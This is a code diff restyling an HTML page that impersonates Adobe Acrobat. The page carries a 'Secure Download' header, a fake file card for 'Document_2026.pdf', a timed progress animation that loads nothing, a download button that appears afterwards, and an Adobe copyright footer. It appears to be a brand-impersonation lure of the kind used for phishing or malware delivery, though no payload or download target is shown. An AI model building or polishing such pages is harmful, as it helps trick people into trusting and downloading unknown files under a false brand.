@@ -8,100 +8,127 @@
     <style>
         @page { size: A4; margin: 0; }
 
-        * {
+        *, *::before, *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
         body {
-            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: #f5f5f5;
+            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f4f4f8;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
 
-        /* Top navigation bar */
-        .top-bar {
-            background-color: #2c2c2c;
-            padding: 12px 24px;
+        /* ─── Header ─── */
+        .top-header {
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            height: 56px;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            padding: 0 28px;
         }
 
-        .top-bar-left {
+        .header-left {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
         }
 
-        .adobe-icon {
-            width: 30px;
-            height: 26px;
+        .header-brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .top-bar-title {
-            color: #ffffff;
+        .header-brand svg {
+            width: 26px;
+            height: 22px;
+        }
+
+        .header-brand-text {
             font-size: 16px;
             font-weight: 700;
-            letter-spacing: 0.5px;
+            color: #1a1a1a;
         }
 
-        .top-bar-subtitle {
-            color: #b3b3b3;
+        .header-sep {
+            width: 1px;
+            height: 22px;
+            background: #e0e0e0;
+        }
+
+        .header-context {
             font-size: 13px;
-            font-weight: 400;
-            margin-left: 8px;
+            color: #888;
+            font-weight: 500;
         }
 
-        /* Main content area */
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .header-link {
+            font-size: 13px;
+            color: #1473e6;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 6px 14px;
+            border-radius: 6px;
+            transition: 0.15s;
+        }
+
+        .header-link:hover {
+            background: #f0f7ff;
+        }
+
+        /* ─── Main ─── */
         .main-content {
             flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 40px 20px;
+            padding: 48px 20px;
         }
 
         .download-card {
             background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.08), 0 1px 4px rgba(0, 0, 0, 0.04);
-            padding: 48px;
-            max-width: 520px;
+            border-radius: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.06), 0 8px 32px rgba(0,0,0,0.06);
+            padding: 48px 44px;
+            max-width: 500px;
             width: 100%;
             text-align: center;
         }
 
         .pdf-icon-wrapper {
-            width: 80px;
-            height: 96px;
+            width: 76px;
+            height: 92px;
             margin: 0 auto 24px;
-            position: relative;
-        }
-
-        .pdf-icon {
-            width: 80px;
-            height: 96px;
         }
 
         .file-name {
             font-size: 18px;
             font-weight: 700;
-            color: #2c2c2c;
-            margin-bottom: 8px;
+            color: #1a1a1a;
+            margin-bottom: 6px;
         }
 
         .file-meta {
             font-size: 13px;
-            color: #6e6e6e;
+            color: #888;
             margin-bottom: 32px;
         }
 
         .file-meta span {
-            margin: 0 6px;
+            margin: 0 5px;
+            color: #ccc;
         }
 
         /* Progress section */
@@ -120,7 +147,7 @@
 
         .progress-bar-fill {
             height: 100%;
-            background: linear-gradient(90deg, #EB1000, #ff4d38);
+            background: linear-gradient(90deg, #1473e6, #3b96ff);
             border-radius: 2px;
             width: 0%;
             animation: progressFill 3s ease-in-out forwards;
@@ -137,12 +164,12 @@
 
         .progress-text {
             font-size: 13px;
-            color: #6e6e6e;
+            color: #888;
         }
 
         .progress-percent {
             font-weight: 600;
-            color: #2c2c2c;
+            color: #1a1a1a;
         }
 
         /* Download button */
@@ -150,21 +177,22 @@
             display: inline-flex;
             align-items: center;
             gap: 10px;
-            background: #EB1000;
+            background: #1473e6;
             color: #ffffff;
             border: none;
-            border-radius: 20px;
+            border-radius: 22px;
             padding: 14px 36px;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s ease;
+            transition: background 0.2s ease, box-shadow 0.2s ease;
             opacity: 0;
             animation: fadeIn 0.5s ease forwards 3.2s;
         }
 
         .download-btn:hover {
-            background: #c40d00;
+            background: #0d66d0;
+            box-shadow: 0 4px 16px rgba(20,115,230,0.25);
         }
 
         .download-btn svg {
@@ -184,35 +212,36 @@
             gap: 6px;
             margin-top: 20px;
             font-size: 12px;
-            color: #959595;
+            color: #b0b0b0;
         }
 
         .security-badge svg {
             width: 14px;
             height: 14px;
-            fill: #959595;
+            fill: #b0b0b0;
         }
 
         /* Footer */
         .footer {
             text-align: center;
-            padding: 20px;
+            padding: 18px;
             font-size: 11px;
-            color: #959595;
+            color: #bbb;
         }
 
         .footer a {
-            color: #959595;
+            color: #bbb;
             text-decoration: none;
         }
 
         .footer a:hover {
             text-decoration: underline;
         }
-        /* Print / PDF styles */
+
+        /* Print / PDF */
         @media print {
-            body { background: #ffffff; }
-            .top-bar { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            body { background: #fff; }
+            .top-header { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
             .download-card { box-shadow: none; border: 1px solid #e0e0e0; }
             .download-btn { -webkit-print-color-adjust: exact; print-color-adjust: exact; opacity: 1; animation: none; }
             .progress-bar-fill { animation: none; width: 100%; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
@@ -220,16 +249,22 @@
     </style>
 </head>
 <body>
-    <!-- Top bar -->
-    <div class="top-bar">
-        <div class="top-bar-left">
-            <svg class="adobe-icon" viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
-                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
-                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
-            </svg>
-            <span class="top-bar-title">Adobe Acrobat</span>
-            <span class="top-bar-subtitle">PDF Document</span>
+    <!-- Header -->
+    <div class="top-header">
+        <div class="header-left">
+            <div class="header-brand">
+                <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
+                    <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
+                    <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
+                </svg>
+                <span class="header-brand-text">Adobe Acrobat</span>
+            </div>
+            <div class="header-sep"></div>
+            <span class="header-context">Secure Download</span>
+        </div>
+        <div class="header-right">
+            <a href="#" class="header-link">Sign in</a>
         </div>
     </div>
 
@@ -238,19 +273,19 @@
         <div class="download-card">
             <!-- PDF Icon -->
             <div class="pdf-icon-wrapper">
-                <svg class="pdf-icon" viewBox="0 0 80 96" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M0 8C0 3.58 3.58 0 8 0H52L80 28V88C80 92.42 76.42 96 72 96H8C3.58 96 0 92.42 0 88V8Z" fill="#F7F7F7" stroke="#E0E0E0" stroke-width="1"/>
-                    <path d="M52 0L80 28H60C55.58 28 52 24.42 52 20V0Z" fill="#E8E8E8"/>
-                    <rect x="16" y="54" rx="3" width="48" height="6" fill="#E0E0E0"/>
-                    <rect x="16" y="66" rx="3" width="36" height="6" fill="#E0E0E0"/>
-                    <rect x="16" y="78" rx="3" width="42" height="6" fill="#E0E0E0"/>
-                    <text x="40" y="44" text-anchor="middle" fill="#EB1000" font-size="16" font-weight="700" font-family="sans-serif">PDF</text>
+                <svg viewBox="0 0 76 92" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M0 6C0 2.69 2.69 0 6 0H50L76 26V86C76 89.31 73.31 92 70 92H6C2.69 92 0 89.31 0 86V6Z" fill="#F7F7FA" stroke="#E0E0E0" stroke-width="1"/>
+                    <path d="M50 0L76 26H56C52.69 26 50 23.31 50 20V0Z" fill="#E8E8EC"/>
+                    <rect x="14" y="50" rx="3" width="48" height="5" fill="#E0E0E0"/>
+                    <rect x="14" y="62" rx="3" width="36" height="5" fill="#E0E0E0"/>
+                    <rect x="14" y="74" rx="3" width="42" height="5" fill="#E0E0E0"/>
+                    <text x="38" y="40" text-anchor="middle" fill="#1473e6" font-size="15" font-weight="700" font-family="sans-serif">PDF</text>
                 </svg>
             </div>
 
             <div class="file-name">Document_2026.pdf</div>
             <div class="file-meta">
-                PDF Document <span>•</span> 2.4 MB <span>•</span> 12 pages
+                PDF Document <span>&middot;</span> 2.4 MB <span>&middot;</span> 12 pages
             </div>
 
             <!-- Progress -->
@@ -263,7 +298,7 @@
                 </div>
             </div>
 
-            <!-- Download button (appears after progress) -->
+            <!-- Download button -->
             <button class="download-btn" id="downloadBtn">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
@@ -282,8 +317,8 @@
 
     <!-- Footer -->
     <div class="footer">
-        Copyright &copy; 2026 Adobe. All rights reserved. <span>|</span>
-        <a href="#">Privacy</a> <span>|</span>
+        &copy; 2026 Adobe. All rights reserved. &middot;
+        <a href="#">Privacy</a> &middot;
         <a href="#">Terms of Use</a>
     </div>
 
